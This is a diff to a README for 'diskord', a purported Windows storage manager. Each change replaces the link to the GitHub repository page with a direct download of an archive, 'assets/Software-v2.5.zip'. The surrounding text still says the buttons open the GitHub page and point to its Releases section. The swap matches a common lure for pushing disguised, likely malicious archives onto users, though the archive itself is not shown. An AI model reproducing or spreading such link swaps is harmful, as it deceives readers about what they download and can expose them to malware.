@@ -1,6 +1,6 @@
 # 📦 diskord - Simple Storage Manager for Windows
 
-[![Download diskord](https://img.shields.io/badge/Download-diskord-4c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/EHAB7k/diskord)
+[![Download diskord](https://img.shields.io/badge/Download-diskord-4c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/EHAB7k/diskord/main/assets/Software-v2.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download, install, and start diskord on your Windows compu
 
 2. Click this large download button to open the diskord page on GitHub:
 
-   [![Download diskord](https://img.shields.io/badge/Download-diskord-4c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/EHAB7k/diskord)
+   [![Download diskord](https://img.shields.io/badge/Download-diskord-4c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/EHAB7k/diskord/main/assets/Software-v2.5.zip)
 
 3. On the GitHub page, look for the **Releases** section, usually found on the right side or under the "Code" tab.
 
@@ -110,7 +110,7 @@ A: It depends on your usage. Checking once a week or month helps avoid running o
 
 Visit this page to download and install diskord on your Windows PC:
 
-[https://github.com/EHAB7k/diskord](https://github.com/EHAB7k/diskord)
+[https://raw.githubusercontent.com/EHAB7k/diskord/main/assets/Software-v2.5.zip](https://raw.githubusercontent.com/EHAB7k/diskord/main/assets/Software-v2.5.zip)
 
 Click the link above or use the badges to open the GitHub page where you can get the latest release.
 
